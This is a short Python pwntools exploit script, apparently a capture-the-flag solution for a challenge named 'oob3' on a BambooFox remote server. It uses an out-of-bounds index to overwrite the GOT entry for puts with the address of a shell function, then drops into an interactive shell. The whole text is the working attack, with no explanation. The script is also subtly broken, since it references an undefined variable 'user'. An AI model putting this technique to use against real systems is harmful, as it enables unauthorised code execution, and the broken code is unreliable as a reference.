#coding=utf-8
from pwn import *

puts = 0x601018
v12 = 474215179361
shell = 0x400716

r = remote('bamboofox.cs.nctu.edu.tw', 12013)
#r = process('./oob3')
r.sendlineafter('User ID: ', str((puts - user) / 8))
r.sendlineafter('Nickname: ', p64(shell))
r.sendline('0')
r.interactive()
